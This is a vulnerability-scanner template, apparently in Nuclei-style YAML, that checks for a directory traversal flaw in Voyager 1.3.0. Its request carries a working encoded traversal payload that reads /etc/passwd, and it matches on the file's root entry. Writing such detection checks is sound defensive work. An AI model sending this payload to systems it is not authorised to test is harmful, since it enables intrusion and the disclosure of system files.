id: "voyager-lfi"
name: "Voyager 1.3.0 - Directory Traversal"
severity: "high"
description: "Voyager 1.3.0 is vulnerable to local file inclusion."
tech:
  - "generic"
tags:
  - "voyager"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/47875"
spaExclusion: true
request:
  method: "GET"
  path: "/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "word"
    part: "header"
    words:
      - "text/plain"
  - type: "status"
    status:
      - 200
